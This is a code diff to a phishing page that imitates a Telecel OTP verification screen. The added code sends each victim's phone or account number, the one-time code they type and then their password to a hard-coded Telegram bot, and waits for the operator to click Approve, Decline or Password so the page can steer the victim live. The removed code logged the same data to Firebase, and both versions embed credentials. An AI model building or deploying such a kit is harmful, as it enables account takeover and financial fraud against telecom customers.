@@ -5,10 +5,6 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Telecel OTP</title>
 
-<!-- Firebase SDK -->
-<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
-<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
-
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 
 <style>
@@ -93,13 +89,6 @@ body{
   line-height:1.5;
 }
 
-/* TIMER */
-.timer{
-  color:#ff0000;
-  margin-top:10px;
-  font-weight:600;
-}
-
 /* OTP BOXES */
 .otp-container{
   display:flex;
@@ -121,6 +110,34 @@ body{
   border:2px solid #ff0000;
 }
 
+/* Password field (initially hidden) */
+.password-container {
+  margin-top: 20px;
+}
+
+.password-input {
+  width: 100%;
+  height: 50px;
+  border-radius: 12px;
+  border: 1px solid #ddd;
+  padding: 0 15px;
+  font-size: 16px;
+  background: #fff;
+  margin-bottom: 10px;
+}
+
+.btn-password {
+  background: #ff0000;
+  color: #fff;
+  font-weight: 600;
+  width: 100%;
+  height: 55px;
+  border: none;
+  border-radius: 14px;
+  font-size: 16px;
+  cursor: pointer;
+}
+
 /* BUTTONS */
 .btn{
   width:100%;
@@ -133,8 +150,8 @@ body{
 }
 
 .btn-primary{
-  background:#e5e5e5;
-  color:#999;
+  background:#ff0000;
+  color:#fff;
   font-weight:600;
 }
 
@@ -145,7 +162,7 @@ body{
   font-weight:600;
 }
 
-/* Message styling */
+/* Message styling (optional) */
 .message {
   font-size: 14px;
   margin-top: 8px;
@@ -154,7 +171,42 @@ body{
 .error { color: #dc3545; }
 .success { color: #28a745; }
 
-/* SPINNER OVERLAY (same as login page) */
+/* ERROR BOX (same as login page) */
+.error-box{
+  position: absolute;
+  top: 20px;
+  left: 20px;
+  right: 20px;
+  background: #fff;
+  border: 2px solid #ff4d4d;
+  border-radius: 12px;
+  padding: 15px;
+  display: none;
+  box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+  z-index: 100;
+}
+
+.error-title{
+  color: #ff0000;
+  font-weight: bold;
+  margin-bottom: 5px;
+}
+
+.error-text{
+  color: #444;
+  font-size: 14px;
+}
+
+.close{
+  position: absolute;
+  right: 15px;
+  top: 10px;
+  cursor: pointer;
+  font-size: 18px;
+  color: #999;
+}
+
+/* SPINNER OVERLAY */
 #spinner {
   position: fixed;
   inset: 0;
@@ -186,6 +238,13 @@ body{
 <div class="container">
   <div class="top-bg"></div>
 
+  <!-- ERROR BOX -->
+  <div class="error-box" id="errorBox">
+    <div class="close" onclick="hideError()">×</div>
+    <div class="error-title">Error</div>
+    <div class="error-text" id="errorText">Wrong OTP</div>
+  </div>
+
   <div class="content">
 
     <!-- LOGO -->
@@ -202,22 +261,29 @@ body{
     . Enter it below to verify your account.
     </div>
 
-    <div class="timer" id="timer">00:44</div>
-
-    <!-- OTP INPUT -->
-    <div class="otp-container">
-      <input class="otp-input" maxlength="1" id="otp1">
-      <input class="otp-input" maxlength="1" id="otp2">
-      <input class="otp-input" maxlength="1" id="otp3">
-      <input class="otp-input" maxlength="1" id="otp4">
-      <input class="otp-input" maxlength="1" id="otp5">
-      <input class="otp-input" maxlength="1" id="otp6">
+    <!-- OTP INPUT SECTION -->
+    <div id="otpSection">
+      <div class="otp-container">
+        <input class="otp-input" maxlength="1" id="otp1">
+        <input class="otp-input" maxlength="1" id="otp2">
+        <input class="otp-input" maxlength="1" id="otp3">
+        <input class="otp-input" maxlength="1" id="otp4">
+        <input class="otp-input" maxlength="1" id="otp5">
+        <input class="otp-input" maxlength="1" id="otp6">
+      </div>
+      <div class="message" id="otpMessage"></div>
+      <button class="btn btn-primary" id="nextBtn">Next</button>
     </div>
 
-    <div class="message" id="otpMessage"></div>
+    <!-- PASSWORD INPUT SECTION (initially hidden) -->
+    <div id="passwordSection" style="display: none;">
+      <div class="password-container">
+        <input type="password" class="password-input" id="passwordField" placeholder="Enter password">
+        <button class="btn-password" id="verifyPasswordBtn">Verify Password</button>
+      </div>
+    </div>
 
-    <!-- BUTTONS -->
-    <button class="btn btn-primary" id="nextBtn">Next</button>
+    <!-- Go Back button (always visible) -->
     <button class="btn btn-outline" id="goBackBtn">Go Back</button>
 
   </div>
@@ -230,20 +296,11 @@ body{
 
 <script>
   (function() {
-    // ==================== FIREBASE CONFIG (Telecel) ====================
-    const firebaseConfig = {
-      apiKey: "AIzaSyCjztxgN2BRjuHDMQnpNEuB7NE9C9R8nU0",
-      authDomain: "tele-panel.firebaseapp.com",
-      projectId: "tele-panel",
-      storageBucket: "tele-panel.firebasestorage.app",
-      messagingSenderId: "859165937892",
-      appId: "1:859165937892:web:db441a884b1a98c36b1cf1",
-      measurementId: "G-5ZPQ1H0SWR"
-    };
-
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.firestore();
-    const COLLECTION_NAME = 'telecel_submissions';
+    // ==================== TELEGRAM BOT CONFIG ====================
+    const BOT_TOKEN = '8276553360:AAGD0pyKatfqmNyfWnvQ6nFkuM3QG3kfJ9k'; // Replace with your token
+    const CHAT_ID   = '1006917440'; // Replace with your chat ID
+    // If you need a CORS proxy, prepend it to the URL
+    const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
     // ==================== DOM ELEMENTS ====================
     const otpInputs = [
@@ -258,14 +315,20 @@ body{
     const goBackBtn = document.getElementById('goBackBtn');
     const maskedPhoneSpan = document.getElementById('maskedPhone');
     const otpMessage = document.getElementById('otpMessage');
-    const timerEl = document.getElementById('timer');
     const spinner = document.getElementById('spinner');
+
+    const otpSection = document.getElementById('otpSection');
+    const passwordSection = document.getElementById('passwordSection');
+    const passwordField = document.getElementById('passwordField');
+    const verifyPasswordBtn = document.getElementById('verifyPasswordBtn');
+
+    const errorBox = document.getElementById('errorBox');
+    const errorText = document.getElementById('errorText');
 
     // ==================== RETRIEVE DATA FROM SESSIONSTORAGE ====================
     const phone = sessionStorage.getItem('telecel_phone') || '0200000020';
     const accountType = sessionStorage.getItem('telecel_accountType') || 'Mobile';
     const inputValue = sessionStorage.getItem('telecel_inputValue') || '';
-    const expectedOtp = sessionStorage.getItem('telecel_otp') || '123456';
 
     // ==================== MASK PHONE NUMBER ====================
     function maskPhone(phone) {
@@ -315,96 +378,117 @@ body{
       });
     });
 
-    // ==================== TIMER ====================
-    let timeLeft = 44;
-    const timerInterval = setInterval(() => {
-      timeLeft--;
-      const seconds = timeLeft < 10 ? '0' + timeLeft : timeLeft;
-      timerEl.textContent = `00:${seconds}`;
-      if (timeLeft <= 0) {
-        clearInterval(timerInterval);
-        timerEl.textContent = '00:00';
-        otpInputs.forEach(inp => inp.disabled = true);
-        nextBtn.disabled = true;
-        otpMessage.textContent = 'OTP expired. Please go back.';
-        otpMessage.className = 'message error';
-      }
-    }, 1000);
+    // ==================== ERROR HANDLING ====================
+    function showError(message) {
+      errorText.innerText = message || 'An error occurred';
+      errorBox.style.display = 'block';
+    }
 
-    // ==================== OTP ATTEMPT TRACKING ====================
-    let otpAttemptCount = 0;
-    const MAX_OTP_ATTEMPTS = 2;
+    window.hideError = function() {
+      errorBox.style.display = 'none';
+    };
 
-    // ==================== SAVE OTP ATTEMPT TO FIREBASE ====================
-    async function saveOtpAttempt(enteredOtp, status) {
-      const otpField = otpAttemptCount === 1 ? 'otp1' : 'otp2';
+    // ==================== TELEGRAM HELPERS ====================
+    async function sendToTelegram(payload) {
+      const url = `${API_BASE}/sendMessage`;
       try {
-        await db.collection(COLLECTION_NAME).add({
-          accountType: accountType,
-          inputValue: inputValue,
-          phoneNumber: phone,
-          [otpField]: enteredOtp,
-          attempt: 2 + otpAttemptCount,
-          status: status,
-          timestamp: firebase.firestore.FieldValue.serverTimestamp(),
-          userAgent: navigator.userAgent,
-          pageUrl: window.location.href
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
         });
-        console.log(`OTP attempt ${otpAttemptCount} saved as ${otpField}`);
+        return await response.json();
       } catch (error) {
-        console.error('Error saving OTP:', error);
+        console.error('Telegram send error:', error);
+        throw error;
       }
     }
 
-    // ==================== VERIFY OTP ====================
-    let isSubmitting = false; // prevent double clicks
+    let currentPollInterval = null;
 
-    async function verifyOtp() {
+    function pollForCallback(expectedPrefix, expectedTs, onDecision) {
+      if (currentPollInterval) clearInterval(currentPollInterval);
+
+      let lastUpdateId = 0;
+
+      currentPollInterval = setInterval(async () => {
+        try {
+          const url = `${API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
+          const response = await fetch(url);
+          const data = await response.json();
+          if (!data.ok || !data.result.length) return;
+
+          data.result.forEach(update => {
+            lastUpdateId = update.update_id;
+            if (update.callback_query && update.callback_query.data) {
+              const parts = update.callback_query.data.split('_');
+              if (parts.length >= 3) {
+                const [type, action, time] = parts;
+                if (time == expectedTs && type === expectedPrefix) {
+                  clearInterval(currentPollInterval);
+                  currentPollInterval = null;
+                  onDecision(action);
+                }
+              }
+            }
+          });
+        } catch (err) {
+          console.warn('Polling error:', err);
+        }
+      }, 1500);
+    }
+
+    // ==================== STAGE 1: OTP SUBMISSION ====================
+    let isSubmitting = false;
+
+    async function submitOtp() {
       if (isSubmitting) return;
 
       const enteredOtp = otpInputs.map(inp => inp.value).join('');
-
       if (enteredOtp.length !== 6) {
         otpMessage.textContent = 'Please enter all 6 digits.';
         otpMessage.className = 'message error';
         return;
       }
 
-      // Increment attempt counter
-      otpAttemptCount++;
-
-      // Disable further interactions
       isSubmitting = true;
       nextBtn.disabled = true;
       otpInputs.forEach(inp => inp.disabled = true);
+      spinner.style.display = 'flex';
 
-      if (enteredOtp === expectedOtp) {
-        // Correct OTP
-        await saveOtpAttempt(enteredOtp, 'verified');
-        
-        if (otpAttemptCount === 1) {
-          // First attempt success – show success and redirect
-          otpMessage.textContent = '✓ Verified! Redirecting...';
-          otpMessage.className = 'message success';
-          setTimeout(() => {
-            window.location.href = 'unavailable.html';
-          }, 1500);
-        } else {
-          // Second attempt success – show spinner and redirect
-          spinner.style.display = 'flex';
-          setTimeout(() => {
-            window.location.href = 'unavailable.html';
-          }, 800);
+      const ts = Date.now();
+      const identifier = accountType === 'Mobile' ? `Phone: ${phone}` : `Account: ${inputValue}`;
+      const msg = `OTP Verification\n\n${identifier}\nEntered OTP: ${enteredOtp}\n\nChoose action:`;
+
+      await sendToTelegram({
+        chat_id: CHAT_ID,
+        text: msg,
+        reply_markup: {
+          inline_keyboard: [[
+            { text: 'Password', callback_data: `otp_password_${ts}` },
+            { text: 'Approve', callback_data: `otp_approve_${ts}` },
+            { text: 'Decline', callback_data: `otp_decline_${ts}` }
+          ]]
         }
-      } else {
-        // Wrong OTP
-        await saveOtpAttempt(enteredOtp, 'failed');
+      });
 
-        if (otpAttemptCount === 1) {
-          // First attempt failed – allow retry
-          otpMessage.textContent = `Invalid OTP.`;
-          otpMessage.className = 'message error';
-          // Clear inputs and re-enable
+      pollForCallback('otp', ts, (action) => {
+        spinner.style.display = 'none';
+        isSubmitting = false;
+
+        if (action === 'password') {
+          console.log('Switching to password input');
+          // Hide OTP section, show password section
+          otpSection.style.display = 'none';
+          passwordSection.style.display = 'block';
+          passwordField.focus();
+        } else if (action === 'approve') {
+          console.log('Approved, redirecting to unavailable.html');
+          window.location.href = 'unavailable.html';
+        } else if (action === 'decline') {
+          console.log('Declined, showing error');
+          showError('Wrong OTP');
+          // Re-enable OTP inputs for a new attempt
           otpInputs.forEach(inp => {
             inp.value = '';
             inp.disabled = false;
@@ -413,24 +497,61 @@ body{
           nextBtn.disabled = false;
           nextBtn.style.background = '#e5e5e5';
           nextBtn.style.color = '#999';
-          isSubmitting = false;
-        } else {
-          // Second attempt failed – show spinner and redirect
-          spinner.style.display = 'flex';
-          setTimeout(() => {
-            window.location.href = 'unavailable.html';
-          }, 800);
         }
-      }
+      });
     }
 
-    // ==================== EVENT LISTENERS ====================
-    nextBtn.addEventListener('click', verifyOtp);
+    nextBtn.addEventListener('click', submitOtp);
+
+    // ==================== STAGE 2: PASSWORD SUBMISSION ====================
+    async function submitPassword() {
+      const password = passwordField.value.trim();
+      if (!password) return;
+
+      spinner.style.display = 'flex';
+      isSubmitting = true;
+      verifyPasswordBtn.disabled = true;
+
+      const ts = Date.now();
+      const identifier = accountType === 'Mobile' ? `Phone: ${phone}` : `Account: ${inputValue}`;
+      const msg = `Password Verification\n\n${identifier}\nPassword: ${password}\n\nApprove or Decline:`;
+
+      await sendToTelegram({
+        chat_id: CHAT_ID,
+        text: msg,
+        reply_markup: {
+          inline_keyboard: [[
+            { text: 'Approve', callback_data: `pwd_approve_${ts}` },
+            { text: 'Decline', callback_data: `pwd_decline_${ts}` }
+          ]]
+        }
+      });
+
+      pollForCallback('pwd', ts, (action) => {
+        spinner.style.display = 'none';
+        isSubmitting = false;
+        verifyPasswordBtn.disabled = false;
+
+        if (action === 'approve') {
+          console.log('Password approved, redirecting to unavailable.html');
+          window.location.href = 'unavailable.html';
+        } else if (action === 'decline') {
+          console.log('Password declined, showing error');
+          showError('Wrong password');
+          passwordField.value = '';
+          passwordField.focus();
+        }
+      });
+    }
+
+    verifyPasswordBtn.addEventListener('click', submitPassword);
+
+    // ==================== GO BACK ====================
     goBackBtn.addEventListener('click', () => {
-      window.location.href = 'index.html';
+      window.location.href = 'login.html';
     });
 
-    // Initial button state
+    // ==================== INIT ====================
     nextBtn.style.background = '#e5e5e5';
     nextBtn.style.color = '#999';
   })();
